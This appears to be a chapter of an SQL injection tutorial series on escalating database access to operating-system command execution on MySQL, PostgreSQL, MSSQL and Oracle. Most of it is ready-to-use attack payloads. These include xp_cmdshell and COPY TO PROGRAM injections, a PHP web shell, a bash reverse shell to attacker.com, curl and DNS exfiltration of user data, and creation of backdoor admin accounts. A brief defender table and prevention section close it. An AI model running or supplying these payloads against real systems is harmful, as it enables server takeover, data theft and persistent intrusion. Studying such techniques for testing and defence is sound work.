# 11 - OS Command Execution via SQLi

## Ultimate Goal: System Shell

OS command execution = full server compromise.

## MySQL OS Command Execution

### UDF (User Defined Functions) - Most Reliable

#### Step 1: Find Plugin Directory

```sql
SELECT @@plugin_dir
-- Result: /usr/lib/mysql/plugin/ or similar
```

#### Step 2: Write UDF Library

```sql
-- Create UDF library file (pre-compiled .so or .dll)
-- Write via INTO DUMPFILE (binary safe)

SELECT 0x7f454c4602010100... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'
```

#### Step 3: Create Function and Execute

```sql
-- Create function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'

-- Execute command
SELECT sys_exec('id > /tmp/output.txt')

-- Read output
SELECT LOAD_FILE('/tmp/output.txt')
```

### Alternative: Backticks (Deprecated)

```sql
-- Old MySQL versions only
SELECT `id` FROM users
-- If backticks misinterpreted as command substitution
```

### Via PHP (Application Context)

```sql
-- If application reads query result and passes to PHP eval
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'
```

## PostgreSQL OS Command Execution

### COPY TO PROGRAM (9.3+)

```sql
-- Direct command execution (superuser required)
COPY (SELECT '') TO PROGRAM 'id'

-- With output redirection
COPY (SELECT '') TO PROGRAM 'cat /etc/passwd > /tmp/output.txt'

-- Complex commands
COPY (SELECT '') TO PROGRAM 'bash -c "id; whoami; hostname"'

-- Read output file via SQL
COPY (SELECT '') FROM '/tmp/output.txt'
```

### PostgreSQL Extensions

#### PL/pgSQL

```sql
-- Create PL/pgSQL function
CREATE OR REPLACE FUNCTION exec(cmd TEXT) RETURNS TEXT AS $$
BEGIN
  RETURN (SELECT * FROM pg_read_file(cmd));
END;
$$ LANGUAGE plpgsql;

-- Limited, better use COPY TO PROGRAM
```

### Perl/Python Extensions (If Installed)

```sql
-- If plpythonu available
CREATE LANGUAGE plpythonu

CREATE FUNCTION pyshell(cmd text)
RETURNS text AS $$
import os
return os.popen(cmd).read()
$$ LANGUAGE plpythonu

-- Execute
SELECT pyshell('id')
```

## MSSQL OS Command Execution

### xp_cmdshell (Primary Method)

#### Enable xp_cmdshell

```sql
-- Check if enabled
EXEC sp_configure 'xp_cmdshell'

-- Enable (requires sysadmin)
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Execute
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'dir C:\\'
```

#### Via SQL Injection

```sql
-- Stacked query for enable and execute
'; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;--
'; EXEC xp_cmdshell ''whoami'';--

-- Single request enable + execute
'; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;
EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;
EXEC xp_cmdshell ''net user'';--
```

### sp_OACreate (Alternative)

```sql
-- Execute via OLE Automation (if enabled)
DECLARE @shell INT
EXEC sp_OACreate 'wscript.shell', @shell OUT
EXEC sp_OAMethod @shell, 'run', NULL, 'C:\\windows\\system32\\cmd.exe /c whoami > C:\\temp\\output.txt'

-- Read output via SQL
EXEC xp_cmdshell 'type C:\\temp\\output.txt'
```

### CLR Integration (MSSQL 2005+)

```sql
-- Create CLR stored procedure (requires assembly)
-- More complex but powerful
```

## Oracle OS Command Execution

### PL/SQL Methods

#### Java Stored Procedures (If enabled)

```sql
-- Create Java stored procedure
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "OSExec" AS
import java.lang.*;
import java.io.*;
public class OSExec {
  public static String exec(String cmd) throws Exception {
    Runtime r = Runtime.getRuntime();
    Process p = r.exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line, result = "";
    while ((line = br.readLine()) != null) result += line + "\n";
    return result;
  }
}
/

-- Create PL/SQL wrapper
CREATE OR REPLACE FUNCTION execute_cmd(cmd IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'OSExec.exec(java.lang.String) return java.lang.String';
/

-- Execute
SELECT execute_cmd('id') FROM DUAL
```

#### DBMS_SCHEDULER

```sql
-- Create job to execute command
BEGIN
  DBMS_SCHEDULER.create_job(
    job_name => 'CMD',
    job_type => 'EXECUTABLE',
    job_action => '/bin/sh',
    number_of_arguments => 2,
    start_date => SYSTIMESTAMP,
    enabled => FALSE
  );
  DBMS_SCHEDULER.set_job_argument_value('CMD', 1, '-c');
  DBMS_SCHEDULER.set_job_argument_value('CMD', 2, 'id > /tmp/oracle_cmd.txt');
  DBMS_SCHEDULER.enable('CMD');
END;
/
```

#### External Tables (Less Common)

```sql
-- Create external table with PREPROCESSOR
CREATE TABLE cmd_output (line VARCHAR2(4000))
ORGANIZATION EXTERNAL (
  TYPE ORACLE_LOADER
  DEFAULT DIRECTORY DATA_PUMP_DIR
  ACCESS PARAMETERS (
    RECORDS DELIMITED BY NEWLINE
    PREPROCESSOR DATA_PUMP_DIR: '/bin/sh'
    FIELDS TERMINATED BY ','
  )
  LOCATION ('dummy.txt')
);

-- Access triggers command
SELECT * FROM cmd_output
```

## Output Retrieval Methods

### 1. Write to File then Read

```sql
-- Execute and write output
EXEC xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\output.txt'

-- Read via HTTP request
-- http://target.com/output.txt
```

### 2. DNS Exfiltration

```sql
-- MySQL via UDF
SELECT sys_exec('nslookup $(whoami).attacker.com')

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com'

-- MSSQL
EXEC xp_cmdshell 'nslookup %USERNAME%.attacker.com'
```

### 3. HTTP Request

```sql
-- Send output via curl/wget
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=$(whoami)'

-- MSSQL
EXEC xp_cmdshell 'powershell -c "(New-Object Net.WebClient).DownloadString(''http://attacker.com/?d='' + (whoami))"'
```

### 4. Time-Based Channel

```sql
-- True if command succeeds, false if fails
' AND IF((SELECT sys_exec('test -f /etc/passwd')), SLEEP(5), 0)--
```

## Post-Exploitation via SQLi

### Establish Persistence

```sql
-- Create admin user (MSSQL)
'; CREATE LOGIN backdoor WITH PASSWORD = ''P@ssw0rd123'';
EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin'';--

-- Create backdoor job (PostgreSQL)
'; CREATE OR REPLACE FUNCTION backdoor() RETURNS void AS $$
BEGIN
  EXECUTE 'CREATE USER attacker WITH SUPERUSER PASSWORD ''secret''';
END;
$$ LANGUAGE plpgsql;--
```

### Data Exfiltration

```sql
-- Dump database and send
'; EXEC xp_cmdshell 'bcp "SELECT * FROM users" queryout C:\\users.txt -c -S localhost -U sa -P password';--
'; EXEC xp_cmdshell 'curl -F "file=@C:\\users.txt" http://attacker.com/upload';--
```

### Lateral Movement

```sql
-- MSSQL: List linked servers
SELECT srvname FROM sysservers

-- Execute on linked server
'; EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];--
```

## Bypassing Restrictions

### Disabled xp_cmdshell

```sql
-- Re-enable via registry (MSSQL)
'; EXEC master..xp_regwrite
  @rootkey=''HKEY_LOCAL_MACHINE'',
  @key=''SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQLServer'',
  @value_name=''xp_cmdshell'',
  @type=''REG_DWORD'',
  @value=1;--
```

### Limited Privileges

```sql
-- Check current privileges
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Escalation via SQL injection to application config
'; SELECT LOAD_FILE('/var/www/html/config.php')--
```

## Practical Examples

### Example 1: Full MSSQL Compromise

```sql
-- Step 1: Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Step 2: Execute reconnaissance
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user'
EXEC xp_cmdshell 'ipconfig'

-- Step 3: Create admin account
EXEC xp_cmdshell 'net user /add attacker P@ssw0rd123'
EXEC xp_cmdshell 'net localgroup administrators attacker /add'

-- Step 4: Exfiltrate data
EXEC xp_cmdshell 'powershell -c "Get-Content C:\\data\\users.csv | curl -d @- http://attacker.com/data"'
```

### Example 2: PostgreSQL RCE

```sql
-- Check version (need 9.3+)
SELECT version()

-- Execute command
COPY (SELECT '') TO PROGRAM 'bash -c "id; whoami; uname -a" > /tmp/recon.txt'

-- Read recon output
COPY (SELECT '') FROM '/tmp/recon.txt'

-- Reverse shell (one-liner)
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

### Example 3: MySQL Web Shell

```sql
-- Write PHP shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Access via browser
-- http://target.com/shell.php?cmd=id
-- http://target.com/shell.php?cmd=cat%20/etc/passwd
```

## Detection and Prevention

### For Defenders

| Technique       | Detection                                      |
| --------------- | ---------------------------------------------- |
| xp_cmdshell     | Monitor sp_configure changes, process creation |
| COPY TO PROGRAM | PostgreSQL logs, process monitoring            |
| UDF loading     | MySQL plugin_dir monitoring                    |
| Web shells      | File integrity monitoring, WAF                 |

### SQL Injection Prevention

```sql
-- Always use prepared statements
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?')
$stmt->execute([$user_id])

-- Principle of least privilege
-- Application DB user: SELECT, INSERT, UPDATE only
-- No DROP, no FILE, no SUPER
```

## Key Takeaways

1. **MSSQL xp_cmdshell** = easiest method if enabled
2. **PostgreSQL COPY TO PROGRAM** = direct execution (superuser)
3. **MySQL UDF** = requires file write and plugin loading
4. **Oracle** = most complex, requires Java/plsql procedures
5. **Output retrieval** = file, DNS, HTTP, or time-based
6. **Prevention** = least privilege + prepared statements

## Next Step

Continue to [12 - Second-Order Injection](12-Second-Order-Injection.md) for stored payload attacks.
